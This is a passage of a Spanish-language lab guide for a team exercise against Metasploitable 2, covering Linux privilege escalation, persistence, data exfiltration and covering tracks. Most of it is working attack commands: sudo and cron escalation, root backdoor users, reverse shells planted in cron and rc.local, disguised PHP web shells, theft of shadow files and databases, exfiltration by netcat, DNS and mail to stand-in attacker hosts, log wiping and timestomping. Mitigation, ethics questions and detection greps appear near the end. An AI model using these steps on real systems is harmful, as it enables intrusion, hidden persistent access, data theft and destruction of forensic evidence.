\#     (root) NOPASSWD: /usr/bin/nmap

**Paso 2: Explotar Sudo Nmap**

\# Si puedes ejecutar nmap como sudo

sudo nmap --interactive

nmap> !sh

\# Verificar

whoami  # root

**Paso 3: Explotar Otros Comandos Sudo Comunes**

**vi/vim:**

sudo vi

\# Dentro de vi:

:!/bin/bash

**less/more:**

sudo less /etc/hosts

\# Dentro de less, presionar:

!/bin/bash

**find:**

sudo find /home -exec /bin/bash \;

**awk:**

sudo awk 'BEGIN {system("/bin/bash")}'

-----
**

**🎯 TÉCNICA 4: Explotación de Tareas Cron**

**Paso 1: Revisar Tareas Cron**

cat /etc/crontab

ls -la /etc/cron.\*

crontab -l

**Paso 2: Buscar Scripts Modificables**

\# Buscar scripts ejecutados por cron

find /etc/cron\* -type f -perm -o+w 2>/dev/null

\# Buscar scripts en crontab

cat /etc/crontab | grep -v "^#"

**Paso 3: Modificar Script de Cron (si es posible)**

\# Ejemplo: Si encuentras un script modificable ejecutado como root

echo '#!/bin/bash' > /path/to/script.sh

echo 'cp /bin/bash /tmp/rootbash' >> /path/to/script.sh

echo 'chmod +s /tmp/rootbash' >> /path/to/script.sh

\# Esperar a que cron ejecute el script

\# Luego:

/tmp/rootbash -p

whoami  # root

-----
**

**🎯 TÉCNICA 5: Explotación de Servicios Vulnerables**

**MySQL UDF (User Defined Function) Exploit**

\# Conectar a MySQL como root (sin contraseña en Metasploitable)

mysql -u root

\# Dentro de MySQL

mysql> use mysql;

mysql> create table foo(line blob);

mysql> insert into foo values(load\_file('/tmp/raptor\_udf2.so'));

mysql> select \* from foo into dumpfile '/usr/lib/raptor\_udf2.so';

mysql> create function do\_system returns integer soname 'raptor\_udf2.so';

mysql> select do\_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');

mysql> \q

\# Ejecutar bash con privilegios

/tmp/rootbash -p

whoami  # root

**NOTA**: Necesitas el archivo raptor\_udf2.so. Puedes compilarlo o descargarlo.

-----
**🎯 TÉCNICA 6: Path Hijacking**

**Contexto**

Si un script ejecutado como root usa comandos sin ruta absoluta, podemos crear nuestro propio comando malicioso.

**Procedimiento**

\# Crear directorio para nuestros binarios maliciosos

mkdir /tmp/hijack

cd /tmp/hijack

\# Crear "comando" malicioso (ejemplo: ps)

echo '#!/bin/bash' > ps

echo 'cp /bin/bash /tmp/rootbash' >> ps

echo 'chmod +s /tmp/rootbash' >> ps

echo '/bin/ps' >> ps  # Ejecutar el ps real para no levantar sospechas

chmod +x ps

\# Modificar PATH para que busque primero en nuestro directorio

export PATH=/tmp/hijack:$PATH

\# Ahora, si algún script con sudo ejecuta "ps" sin ruta absoluta...

\# (Esto requiere encontrar tal script primero)

-----
**

**🎯 TÉCNICA BONUS: Metasploit Local Exploit Suggester**

**Desde Kali con Metasploit**

\# Si tienes una sesión de Meterpreter activa

msfconsole

\# Obtener sesión primero (ejemplo con usermap\_script)

msf6 > use exploit/multi/samba/usermap\_script

msf6 exploit > set RHOSTS <IP\_METASPLOITABLE>

msf6 exploit > set payload cmd/unix/reverse\_netcat

msf6 exploit > set LHOST <IP\_KALI>

msf6 exploit > exploit

\# Una vez con shell, background

^Z  # Ctrl+Z

y

\# Usar suggester

msf6 > use post/multi/recon/local\_exploit\_suggester

msf6 post > set SESSION 1

msf6 post > run

\# Revisar exploits sugeridos y probarlos

-----
**📊 ENTREGABLES DEL EQUIPO 4**

1. **Reporte de Escalada de Privilegios** que incluya:
   1. Resumen ejecutivo de técnicas exitosas
   1. Detalle de cada método intentado
   1. Screenshots de acceso root obtenido
   1. Comandos ejecutados paso a paso
   1. Análisis de por qué funcionó cada técnica
   1. Comparación de efectividad de métodos
1. **Archivos técnicos**:
   1. suid\_binaries.txt
   1. kernel\_info.txt
   1. Exploits utilizados (código fuente)
   1. Screenshots de whoami mostrando root
   1. Archivos creados en /root/ como evidencia
1. **Presentación** (10-15 minutos):
   1. Demostrar EN VIVO al menos 2 técnicas
   1. Explicar vectores de escalada
   1. Mostrar acceso root conseguido
   1. Discutir dificultad de cada método
   1. Entregar acceso root documentado al Equipo 5
1. **Handoff al Equipo 5**:
   1. Credenciales root
   1. Métodos de acceso root
   1. Archivos/backdoors creados
   1. Recomendaciones de persistencia
-----
**🤔 PREGUNTAS DE REFLEXIÓN**

1. ¿Cuál técnica fue más efectiva y por qué?
1. ¿Qué técnica dejó menos rastros?
1. ¿Cómo detectaría un IDS/HIDS estos intentos de escalada?
1. ¿Qué logs se generaron durante la escalada?
1. ¿Cuál técnica es más aplicable en sistemas modernos?
1. ¿Qué diferencia hay entre escalada vertical y horizontal?
-----
**🛡️ MEDIDAS DE MITIGACIÓN**

1. **Binarios SUID**:
   1. Auditar regularmente archivos con SUID/SGID
   1. Remover SUID de binarios innecesarios
   1. Usar nosuid en montajes de particiones
1. **Kernel**:
   1. Mantener kernel actualizado
   1. Aplicar parches de seguridad regularmente
   1. Implementar kernel hardening (grsecurity, SELinux)
1. **Sudo**:
   1. Configurar sudo con principio de mínimo privilegio
   1. Evitar NOPASSWD en comandos peligrosos
   1. Auditar configuración de sudoers regularmente
   1. Usar sudo -l restrictivo
1. **Cron**:
   1. Permisos estrictos en scripts de cron
   1. Usar rutas absolutas en scripts
   1. Auditar tareas cron regularmente
1. **General**:
   1. Implementar AppArmor o SELinux
   1. Monitorear intentos de escalada (auditd)
   1. Implementar detección de anomalías
   1. Segmentación y contenedores
   1. Principle of Least Privilege (PoLP)
-----
**

**👥 EQUIPO 5: PERSISTENCIA Y EXFILTRACIÓN**

**Fase: Persistence, Data Exfiltration & Covering Tracks**

**Objetivo**

Mantener acceso permanente al sistema comprometido, exfiltrar información valiosa, y cubrir rastros del ataque. Simular un APT (Advanced Persistent Threat) completo.

**Escenario Específico**

Eres el equipo de **Persistencia y Exfiltración**. Ya tienes acceso root (gracias al Equipo 4). Tu misión es:

- Establecer múltiples mecanismos de persistencia
- Exfiltrar datos sensibles
- Cubrir rastros del ataque
- Preparar informe final de toda la operación
-----
**📝 PROCEDIMIENTO PASO A PASO**

**Preparación: Acceso Root**

\# Conectar con acceso root (usar método del Equipo 4)

ssh msfadmin@<IP\_METASPLOITABLE>

\# Escalar a root con técnica aprendida

\# O directamente si tienes credenciales root

su root

\# Verificar

whoami  # root

id

\# Crear directorio de trabajo

mkdir -p /tmp/equipo5\_persistence

cd /tmp/equipo5\_persistence

-----
**🎯 MECANISMO 1: Usuario Backdoor**

**Crear Usuario con Privilegios Root**

\# Método 1: Agregar usuario con UID 0 (mismo que root)

useradd -u 0 -o -g 0 -G 0 -M -d /root -s /bin/bash backdoor

echo "backdoor:password123" | chpasswd

\# Verificar

cat /etc/passwd | grep backdoor

id backdoor

\# Probar acceso

su backdoor

whoami  # Debería ser root

exit

\# Método 2: Usuario normal oculto

useradd -m -s /bin/bash support

echo "support:Support2024!" | chpasswd

usermod -aG sudo support

\# Ocultar usuario del login (opcional)

echo "support:x:1001:1001::/home/support:/usr/sbin/nologin" >> /etc/passwd

\# Pero mantener shell real en otro archivo

**Documentar**

cat > /tmp/equipo5\_persistence/usuarios\_backdoor.txt << EOF

=== USUARIOS BACKDOOR CREADOS ===

Usuario 1: backdoor

Password: password123

UID: 0 (root equivalente)

Acceso: ssh backdoor@<IP> o su backdoor

Usuario 2: support

Password: Support2024!

Privilegios: sudo

Acceso: ssh support@<IP>

EOF

-----
**🎯 MECANISMO 2: SSH Backdoor con Llaves**

**Crear Par de Llaves SSH**

\# En Kali (tu máquina atacante)

ssh-keygen -t rsa -b 4096 -f /root/backdoor\_key -N ""

\# Esto crea:

\# - backdoor\_key (privada)

\# - backdoor\_key.pub (pública)

\# Ver llave pública

cat /root/backdoor\_key.pub

**Instalar Llave Pública en Metasploitable**

\# En Metasploitable como root

mkdir -p /root/.ssh

chmod 700 /root/.ssh

\# Agregar tu llave pública

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC..." >> /root/.ssh/authorized\_keys

\# (Pegar el contenido de backdoor\_key.pub)

chmod 600 /root/.ssh/authorized\_keys

\# También para usuario msfadmin

mkdir -p /home/msfadmin/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC..." >> /home/msfadmin/.ssh/authorized\_keys

chmod 600 /home/msfadmin/.ssh/authorized\_keys

chown -R msfadmin:msfadmin /home/msfadmin/.ssh

**Probar Acceso sin Contraseña**

\# Desde Kali

ssh -i /root/backdoor\_key root@<IP\_METASPLOITABLE>

\# Deberías entrar sin contraseña

whoami  # root

**Documentar**

cat > /tmp/equipo5\_persistence/ssh\_backdoor.txt << EOF

=== SSH BACKDOOR ===

Llave privada ubicada en: /root/backdoor\_key (Kali)

Llave pública instalada en:

\- /root/.ssh/authorized\_keys

\- /home/msfadmin/.ssh/authorized\_keys

Acceso:

ssh -i /root/backdoor\_key root@<IP\_METASPLOITABLE>

ssh -i /root/backdoor\_key msfadmin@<IP\_METASPLOITABLE>

EOF

-----
**🎯 MECANISMO 3: Cron Job para Reverse Shell**

**Crear Script de Reverse Shell**

\# En Metasploitable

cat > /usr/local/bin/system\_update.sh << 'EOF'

#!/bin/bash

\# Script de "actualización" del sistema (backdoor)

bash -i >& /dev/tcp/<IP\_KALI>/4444 0>&1 &

EOF

chmod +x /usr/local/bin/system\_update.sh

\# Hacer que parezca legítimo

touch -r /bin/bash /usr/local/bin/system\_update.sh

**Agregar a Crontab**

\# Ejecutar cada 10 minutos

echo "\*/10 \* \* \* \* root /usr/local/bin/system\_update.sh" >> /etc/crontab

\# O cada hora

echo "0 \* \* \* \* root /usr/local/bin/system\_update.sh" >> /etc/crontab

\# Verificar

cat /etc/crontab | grep system\_update

**Preparar Listener en Kali**

\# En Kali, abrir listener

nc -lvnp 4444

\# Esperar 10 minutos (o el tiempo configurado)

\# Deberías recibir una conexión automática

**Documentar**

cat > /tmp/equipo5\_persistence/cron\_backdoor.txt << EOF

=== CRON BACKDOOR ===

Script: /usr/local/bin/system\_update.sh

Cron: Cada 10 minutos

Conexión: Reverse shell a <IP\_KALI>:4444

Para recibir conexión:

nc -lvnp 4444

Nota: El sistema intentará conectarse automáticamente cada 10 minutos

EOF

-----
**🎯 MECANISMO 4: Backdoor en Servicio Web**

**Crear Web Shell PHP**

\# En Metasploitable

cat > /var/www/html/admin\_console.php << 'EOF'

<?php

// Admin Console - Maintenance Tool

if(isset($\_GET['cmd'])) {

`    `$cmd = $\_GET['cmd'];

`    `echo "<pre>" . shell\_exec($cmd) . "</pre>";

}

?>

EOF

chmod 644 /var/www/html/admin\_console.php

chown www-data:www-data /var/www/html/admin\_console.php

**Probar Web Shell**

\# Desde Kali (navegador o curl)

curl "http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=whoami"

curl "http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=id"

curl "http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=ls -la /root"

\# O desde navegador:

\# http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=whoami

**Crear Web Shell Más Sofisticada**

cat > /var/www/html/404.php << 'EOF'

<?php

// Página de error 404 (backdoor oculto)

if($\_SERVER['HTTP\_USER\_AGENT'] == "Mozilla/5.0 (Backdoor)") {

`    `if(isset($\_POST['cmd'])) {

`        `echo shell\_exec($\_POST['cmd']);

`    `}

} else {

`    `// Mostrar página 404 normal

`    `header("HTTP/1.0 404 Not Found");

`    `echo "<h1>404 Not Found</h1>";

`    `echo "The requested URL was not found on this server.";

}

?>

EOF

**Usar Web Shell Sofisticada**

\# Desde Kali

curl -A "Mozilla/5.0 (Backdoor)" -X POST -d "cmd=whoami" http://<IP\_METASPLOITABLE>/404.php

**Documentar**

cat > /tmp/equipo5\_persistence/web\_backdoor.txt << EOF

=== WEB BACKDOORS ===

1\. Web Shell Simple:

`   `URL: http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=COMANDO

`   `Ejemplo: http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=whoami

2\. Web Shell Oculta:

`   `URL: http://<IP\_METASPLOITABLE>/404.php

`   `User-Agent requerido: Mozilla/5.0 (Backdoor)

`   `Método: POST

`   `Parámetro: cmd





Uso:

`   `curl -A "Mozilla/5.0 (Backdoor)" -X POST -d "cmd=whoami" http://<IP\_METASPLOITABLE>/404.php

EOF

-----
**🎯 MECANISMO 5: Modificación de /etc/rc.local**

**Agregar Backdoor al Inicio del Sistema**

\# Editar rc.local (se ejecuta al iniciar el sistema)

cat >> /etc/rc.local << 'EOF'

\# System monitoring service

bash -i >& /dev/tcp/<IP\_KALI>/5555 0>&1 &

exit 0

EOF

chmod +x /etc/rc.local

\# Verificar

cat /etc/rc.local

**Documentar**

cat > /tmp/equipo5\_persistence/startup\_backdoor.txt << EOF

=== STARTUP BACKDOOR ===

Archivo modificado: /etc/rc.local

Acción: Reverse shell al iniciar el sistema

Conexión: <IP\_KALI>:5555

Para recibir conexión al reiniciar:

nc -lvnp 5555

Nota: Se ejecuta automáticamente al reiniciar Metasploitable

EOF

-----
**📦 FASE DE EXFILTRACIÓN**

**Paso 1: Identificar Datos Valiosos**

\# Crear directorio para datos a exfiltrar

mkdir -p /tmp/exfil\_data

\# Recopilar información del sistema

uname -a > /tmp/exfil\_data/system\_info.txt

cat /etc/passwd > /tmp/exfil\_data/passwd.txt

cat /etc/shadow > /tmp/exfil\_data/shadow.txt

cat /etc/group > /tmp/exfil\_data/group.txt

ifconfig > /tmp/exfil\_data/network\_config.txt

ps aux > /tmp/exfil\_data/processes.txt

netstat -tulpn > /tmp/exfil\_data/connections.txt

\# Recopilar configuraciones

cp /etc/ssh/sshd\_config /tmp/exfil\_data/

cp /etc/apache2/apache2.conf /tmp/exfil\_data/ 2>/dev/null

cp /etc/mysql/my.cnf /tmp/exfil\_data/ 2>/dev/null

\# Buscar archivos interesantes

find /home -name "\*.txt" -o -name "\*.pdf" -o -name "\*.doc\*" 2>/dev/null > /tmp/exfil\_data/archivos\_usuarios.txt

**Paso 2: Exfiltrar Bases de Datos**

\# MySQL

mysqldump -u root --all-databases > /tmp/exfil\_data/mysql\_all\_databases.sql

mysqldump -u root mysql > /tmp/exfil\_data/mysql\_users.sql

\# PostgreSQL

su - postgres -c "pg\_dumpall" > /tmp/exfil\_data/postgresql\_all\_databases.sql 2>/dev/null

\# Listar bases de datos

mysql -u root -e "SHOW DATABASES;" > /tmp/exfil\_data/mysql\_databases\_list.txt

**Paso 3: Recopilar Credenciales**

\# Buscar archivos con credenciales

grep -r "password" /var/www/ 2>/dev/null | head -50 > /tmp/exfil\_data/web\_passwords.txt

grep -r "passwd" /home/ 2>/dev/null | head -50 >> /tmp/exfil\_data/web\_passwords.txt

\# Historial de comandos (puede contener credenciales)

cat /root/.bash\_history > /tmp/exfil\_data/root\_bash\_history.txt 2>/dev/null

cat /home/msfadmin/.bash\_history > /tmp/exfil\_data/msfadmin\_bash\_history.txt 2>/dev/null

\# Archivos SSH

cp -r /root/.ssh /tmp/exfil\_data/root\_ssh 2>/dev/null

cp -r /home/msfadmin/.ssh /tmp/exfil\_data/msfadmin\_ssh 2>/dev/null

**Paso 4: Comprimir Datos para Exfiltración**

\# Comprimir todo

cd /tmp

tar -czf exfil\_package.tar.gz exfil\_data/

\# Verificar tamaño

ls -lh exfil\_package.tar.gz

\# Crear checksum para verificar integridad

md5sum exfil\_package.tar.gz > exfil\_package.md5

-----
**📤 MÉTODOS DE EXFILTRACIÓN**

**MÉTODO 1: SCP (Secure Copy)**

\# Desde Metasploitable, copiar a Kali

scp /tmp/exfil\_package.tar.gz root@<IP\_KALI>:/root/exfiltrated\_data/

\# O desde Kali, descargar de Metasploitable

mkdir -p /root/exfiltrated\_data

scp msfadmin@<IP\_METASPLOITABLE>:/tmp/exfil\_package.tar.gz /root/exfiltrated\_data/

**MÉTODO 2: HTTP (Servidor Web Temporal)**

\# En Metasploitable, levantar servidor web temporal

cd /tmp

python -m SimpleHTTPServer 8888 &

\# Desde Kali, descargar

wget http://<IP\_METASPLOITABLE>:8888/exfil\_package.tar.gz -O /root/exfiltrated\_data/exfil\_package.tar.gz

\# Matar servidor web en Metasploitable

killall python

**MÉTODO 3: Netcat (Raw Transfer)**

\# En Kali, preparar receptor

nc -lvnp 9999 > /root/exfiltrated\_data/exfil\_package.tar.gz

\# En Metasploitable, enviar

nc <IP\_KALI> 9999 < /tmp/exfil\_package.tar.gz

**MÉTODO 4: Base64 sobre DNS (Sigiloso)**

\# Dividir archivo en chunks pequeños

split -b 1024 /tmp/exfil\_package.tar.gz /tmp/chunk\_

\# Exfiltrar cada chunk via DNS queries (muy sigiloso)

for file in /tmp/chunk\_\*; do

`    `data=$(base64 $file | tr -d '\n')

`    `# Simular query DNS

`    `nslookup $data.attacker-domain.com

done

\# Nota: Esto requiere un servidor DNS controlado por el atacante

**MÉTODO 5: Exfiltración via ICMP (Covert Channel)**

\# Instalar herramienta (si no está)

\# En Kali:

git clone https://github.com/DhavalKapil/icmptunnel.git

cd icmptunnel

make

\# Configurar túnel ICMP

\# (Avanzado - requiere configuración en ambos lados)

**MÉTODO 6: Email (Sigiloso)**

\# Enviar por email (si hay servidor SMTP configurado)

echo "Datos exfiltrados adjuntos" | mail -s "System Report" -a /tmp/exfil\_package.tar.gz attacker@evil.com

**Documentar Exfiltración**

cat > /tmp/equipo5\_persistence/exfiltracion.txt << EOF

=== DATOS EXFILTRADOS ===

Fecha: $(date)

Tamaño total: $(ls -lh /tmp/exfil\_package.tar.gz | awk '{print $5}')

MD5: $(cat /tmp/exfil\_package.md5)

CONTENIDO:

\- Información del sistema

\- /etc/passwd y /etc/shadow

\- Configuraciones de servicios

\- Dumps de bases de datos MySQL y PostgreSQL

\- Historial de comandos

\- Claves SSH

\- Archivos de usuarios

MÉTODOS UTILIZADOS:

1\. SCP a <IP\_KALI>:/root/exfiltrated\_data/

2\. HTTP temporal en puerto 8888

3\. Netcat en puerto 9999

UBICACIÓN EN KALI:

/root/exfiltrated\_data/exfil\_package.tar.gz

DESCOMPRIMIR:

tar -xzf exfil\_package.tar.gz

EOF

-----
**🧹 FASE DE LIMPIEZA DE RASTROS**

**Paso 1: Limpiar Logs del Sistema**

\# ADVERTENCIA: Esto es destructivo y muy sospechoso en un entorno real

\# Limpiar logs de autenticación

echo "" > /var/log/auth.log

echo "" > /var/log/auth.log.1

\# Limpiar logs de sistema

echo "" > /var/log/syslog

echo "" > /var/log/syslog.1

\# Limpiar logs de Apache

echo "" > /var/log/apache2/access.log

echo "" > /var/log/apache2/error.log

\# Limpiar logs de MySQL

echo "" > /var/log/mysql/error.log

echo "" > /var/log/mysql.log

\# Limpiar wtmp y btmp (registros de login)

echo "" > /var/log/wtmp

echo "" > /var/log/btmp

\# Limpiar lastlog

echo "" > /var/log/lastlog

**Paso 2: Limpiar Historial de Comandos**

\# Limpiar historial de bash

history -c

history -w

\# Limpiar archivos de historial

echo "" > /root/.bash\_history

echo "" > /home/msfadmin/.bash\_history

\# Configurar para no guardar historial (sesión actual)

unset HISTFILE

export HISTFILESIZE=0

export HISTSIZE=0

**Paso 3: Limpiar Archivos Temporales**

\# Eliminar archivos de trabajo (excepto backdoors)

rm -rf /tmp/equipo2\_\*

rm -rf /tmp/equipo3\_\*

rm -rf /tmp/equipo4\_\*

\# NO eliminar /tmp/equipo5\_persistence (documentación)

\# Limpiar archivos de exfiltración

rm -f /tmp/exfil\_package.tar.gz

rm -f /tmp/exfil\_package.md5

rm -rf /tmp/exfil\_data

\# Limpiar exploits compilados

find /tmp -name "\*.c" -delete

find /tmp -name "dirtycow" -delete

**Paso 4: Modificar Timestamps (Timestomping)**

\# Hacer que archivos backdoor parezcan antiguos

touch -t 202001010000 /usr/local/bin/system\_update.sh

touch -t 202001010000 /var/www/html/admin\_console.php

touch -t 202001010000 /var/www/html/404.php

\# O copiar timestamp de archivo legítimo

touch -r /bin/bash /usr/local/bin/system\_update.sh

touch -r /var/www/html/index.php /var/www/html/admin\_console.php

**Paso 5: Limpiar Conexiones de Red Registradas**

\# Limpiar registros de conexiones SSH

sed -i '/backdoor/d' /var/log/auth.log

sed -i '/<IP\_KALI>/d' /var/log/auth.log

\# Limpiar registros de Apache con tu IP

sed -i '/<IP\_KALI>/d' /var/log/apache2/access.log

**Paso 6: Técnicas Avanzadas de Anti-Forense**

\# Sobrescribir espacio libre del disco (hace recuperación más difícil)

\# ADVERTENCIA: Esto puede tardar mucho tiempo

dd if=/dev/zero of=/tmp/fillfile bs=1M

rm -f /tmp/fillfile

\# Limpiar memoria swap

swapoff -a

swapon -a

**Documentar Limpieza**

cat > /tmp/equipo5\_persistence/limpieza\_rastros.txt << EOF

=== LIMPIEZA DE RASTROS REALIZADA ===

LOGS LIMPIADOS:

\- /var/log/auth.log (autenticación)

\- /var/log/syslog (sistema)

\- /var/log/apache2/\* (web)

\- /var/log/mysql/\* (base de datos)

\- /var/log/wtmp, /var/log/btmp (logins)

\- /var/log/lastlog

HISTORIAL:

\- Historial de comandos limpiado

\- Variables HISTFILE deshabilitadas

ARCHIVOS TEMPORALES:

\- Exploits eliminados

\- Archivos de trabajo eliminados

\- Datos de exfiltración eliminados

TIMESTAMPS:

\- Backdoors modificados para parecer antiguos

\- Timestamps copiados de archivos legítimos

NOTA: En un entorno real, esta limpieza agresiva es muy sospechosa

y puede ser detectada por sistemas de File Integrity Monitoring (FIM)

EOF

-----
**📊 ENTREGABLES DEL EQUIPO 5**

**1. Reporte Completo de Persistencia**

cat > /tmp/equipo5\_persistence/REPORTE\_FINAL\_EQUIPO5.txt << EOF

║        REPORTE FINAL - PERSISTENCIA Y EXFILTRACIÓN          ║

║                      EQUIPO 5                                ║

FECHA: $(date)

OBJETIVO: Metasploitable 2 (<IP\_METASPLOITABLE>)

ATACANTE: Kali Linux (<IP\_KALI>)

1\. MECANISMOS DE PERSISTENCIA IMPLEMENTADOS

1\.1 USUARIO BACKDOOR

`   `- Usuario: backdoor

`   `- Password: password123

`   `- UID: 0 (equivalente a root)

`   `- Acceso: ssh backdoor@<IP\_METASPLOITABLE>

1\.2 SSH KEY BACKDOOR

`   `- Llave instalada en: /root/.ssh/authorized\_keys

`   `- Acceso sin contraseña: ssh -i /root/backdoor\_key root@<IP>

1\.3 CRON JOB BACKDOOR

`   `- Script: /usr/local/bin/system\_update.sh

`   `- Frecuencia: Cada 10 minutos

`   `- Acción: Reverse shell a <IP\_KALI>:4444

1\.4 WEB SHELL

`   `- URL Simple: http://<IP>/admin\_console.php?cmd=COMANDO

`   `- URL Oculta: http://<IP>/404.php (requiere User-Agent especial)

1\.5 STARTUP BACKDOOR

`   `- Archivo: /etc/rc.local

`   `- Acción: Reverse shell al iniciar sistema

2\. DATOS EXFILTRADOS

INFORMACIÓN RECOPILADA:

✓ Credenciales del sistema (/etc/passwd, /etc/shadow)

✓ Configuraciones de servicios (SSH, Apache, MySQL)

✓ Dumps completos de bases de datos

✓ Historial de comandos

✓ Claves SSH privadas

✓ Archivos de usuarios

TAMAÑO TOTAL: $(ls -lh /tmp/exfil\_package.tar.gz 2>/dev/null | awk '{print $5}' || echo "N/A")

UBICACIÓN EN KALI: /root/exfiltrated\_data/

MÉTODOS DE EXFILTRACIÓN UTILIZADOS:

✓ SCP (Secure Copy)

✓ HTTP (servidor temporal)

✓ Netcat (transferencia raw)

3\. LIMPIEZA DE RASTROS

ACCIONES REALIZADAS:

✓ Logs del sistema limpiados

✓ Historial de comandos eliminado

✓ Archivos temporales removidos

✓ Timestamps modificados (timestomping)

✓ Registros de conexión eliminados

NOTA: Limpieza agresiva puede ser detectada por FIM/SIEM

4\. RESUMEN EJECUTIVO

NIVEL DE COMPROMISO: TOTAL (Root Access)

PERSISTENCIA: MÚLTIPLE (5 mecanismos independientes)

DETECCIÓN: BAJA (rastros minimizados)

IMPACTO: CRÍTICO

El sistema objetivo está completamente comprometido con múltiples

puntos de acceso persistentes. Incluso si se descubre un backdoor,

existen 4 mecanismos adicionales de acceso.

5\. RECOMENDACIONES DE REMEDIACIÓN

INMEDIATAS:

1\. Desconectar sistema de la red

2\. Realizar análisis forense completo

3\. Revisar todos los usuarios del sistema

4\. Auditar tareas cron y scripts de inicio

5\. Verificar integridad de archivos web

CORTO PLAZO:

1\. Reinstalar sistema desde cero

2\. Cambiar todas las credenciales

3\. Regenerar claves SSH

4\. Restaurar desde backup limpio (si existe)

5\. Implementar monitoreo continuo

LARGO PLAZO:

1\. Implementar HIDS/NIDS

2\. Configurar SIEM para detección de anomalías

3\. Hardening de todos los servicios

4\. Segmentación de red

5\. Programa de actualización de parches

6\. Capacitación en seguridad

EOF

cat /tmp/equipo5\_persistence/REPORTE\_FINAL\_EQUIPO5.txt

**2. Documentación Técnica Completa**

Crear archivo ZIP con toda la documentación:

\# Crear paquete de documentación

cd /tmp

tar -czf equipo5\_documentacion\_completa.tar.gz equipo5\_persistence/

\# Copiar a Kali

scp equipo5\_documentacion\_completa.tar.gz root@<IP\_KALI>:/root/
**\


**3. Presentación PowerPoint/PDF**

**Estructura sugerida:**

SLIDE 1: Portada

\- Título: Persistencia y Exfiltración - Equipo 5

\- Integrantes del equipo

\- Fecha

SLIDE 2: Objetivos

\- Mantener acceso persistente

\- Exfiltrar información sensible

\- Cubrir rastros del ataque

SLIDE 3: Mecanismos de Persistencia (Diagrama)

[Diagrama mostrando los 5 mecanismos]

SLIDE 4-8: Detalle de Cada Mecanismo

\- Screenshot de implementación

\- Comandos utilizados

\- Método de acceso

SLIDE 9: Exfiltración de Datos

\- Qué datos se exfiltraron

\- Métodos utilizados

\- Tamaño y contenido

SLIDE 10: Limpieza de Rastros

\- Logs limpiados

\- Técnicas anti-forenses

\- Limitaciones

SLIDE 11: Demostración en Vivo

\- Acceso via backdoor

\- Mostrar persistencia

\- Ejecutar comandos

SLIDE 12: Detección y Mitigación

\- Cómo detectar estos ataques

\- Herramientas de defensa

\- Recomendaciones

SLIDE 13: Lecciones Aprendidas

\- Dificultades encontradas

\- Técnicas más efectivas

\- Mejoras propuestas


SLIDE 14: Conclusiones

\- Resumen del ataque completo

\- Impacto en la organización

\- Importancia de la defensa en profundidad

-----
**

**🎬 DEMOSTRACIÓN EN VIVO (Para Presentación)**

**Script de Demostración (10 minutos)**

#!/bin/bash

\# Script de demostración para presentación

echo "═══════════════════════════════════════════════════════"

echo "  DEMOSTRACIÓN - PERSISTENCIA Y EXFILTRACIÓN"

echo "═══════════════════════════════════════════════════════"

echo ""

echo "[\*] 1. Acceso via Usuario Backdoor"

echo "    Comando: ssh backdoor@<IP\_METASPLOITABLE>"

read -p "    Presionar ENTER para continuar..."

ssh backdoor@<IP\_METASPLOITABLE> "whoami && id"

echo ""

echo "[\*] 2. Acceso via SSH Key (sin contraseña)"

echo "    Comando: ssh -i backdoor\_key root@<IP\_METASPLOITABLE>"

read -p "    Presionar ENTER para continuar..."

ssh -i /root/backdoor\_key root@<IP\_METASPLOITABLE> "whoami && hostname"

echo ""

echo "[\*] 3. Acceso via Web Shell"

echo "    URL: http://<IP>/admin\_console.php?cmd=whoami"

read -p "    Presionar ENTER para continuar..."

curl -s "http://<IP\_METASPLOITABLE>/admin\_console.php?cmd=whoami"

echo ""

echo "[\*] 4. Recibir Reverse Shell de Cron"

echo "    Listener: nc -lvnp 4444"

echo "    (Esperar hasta 10 minutos para conexión automática)"

read -p "    Presionar ENTER para continuar..."

echo ""

echo "[\*] 5. Verificar Datos Exfiltrados"

echo "    Ubicación: /root/exfiltrated\_data/"

read -p "    Presionar ENTER para continuar..."

ls -lh /root/exfiltrated\_data/

echo ""

echo "═══════════════════════════════════════════════════════"

echo "  DEMOSTRACIÓN COMPLETADA"

echo "═══════════════════════════════════════════════════════"

-----
**🤔 PREGUNTAS DE REFLEXIÓN**

1. **Persistencia**:
   1. ¿Cuál mecanismo de persistencia es más difícil de detectar?
   1. ¿Cuál es más robusto ante reinicios del sistema?
   1. ¿Cómo detectaría un Blue Team estos backdoors?
1. **Exfiltración**:
   1. ¿Qué método de exfiltración es más sigiloso?
   1. ¿Cómo detectaría un DLP (Data Loss Prevention) esta exfiltración?
   1. ¿Qué datos son más valiosos para un atacante real?
1. **Anti-Forense**:
   1. ¿Es posible cubrir completamente los rastros de un ataque?
   1. ¿Qué logs son imposibles de eliminar sin levantar sospechas?
   1. ¿Cómo recuperaría un forense digital la información eliminada?
1. **Ética**:
   1. ¿Cuándo es legal realizar estas técnicas?
   1. ¿Qué responsabilidades tiene un pentester?
   1. ¿Cómo documentar hallazgos de forma profesional?
-----
**🛡️ MEDIDAS DE MITIGACIÓN Y DEFENSA**

**Detección de Persistencia**

\# Comandos para Blue Team / Defensa

\# 1. Auditar usuarios con UID 0

awk -F: '$3 == 0 {print $1}' /etc/passwd

\# Debería mostrar solo "root"

\# 2. Verificar llaves SSH no autorizadas

find / -name "authorized\_keys" -exec cat {} \; 2>/dev/null

\# 3. Auditar tareas cron sospechosas

cat /etc/crontab

ls -la /etc/cron.\*

crontab -l -u root

\# 4. Buscar web shells

find /var/www -name "\*.php" -exec grep -l "shell\_exec\|system\|passthru\|exec" {} \;

\# 5. Verificar scripts de inicio

ls -la /etc/rc.local

cat /etc/rc.local

\# 6. Buscar procesos sospechosos

ps aux | grep -E "nc|netcat|/dev/tcp|bash -i"

\# 7. Verificar conexiones de red anómalas

netstat -tulpn | grep ESTABLISHED

**Herramientas de Defensa**

1. **HIDS (Host Intrusion Detection System)**:
   1. OSSEC
   1. Wazuh
   1. Tripwire
1. **File Integrity Monitoring**:
   1. AIDE (Advanced Intrusion Detection Environment)
   1. Samhain
   1. Tripwire
1. **Log Management**:
   1. ELK Stack (Elasticsearch, Logstash, Kibana)
   1. Splunk
   1. Graylog
1. **Network Monitoring**:
   1. Snort
   1. Suricata
   1. Zeek (Bro)
1. **Endpoint Detection and Response (EDR)**:
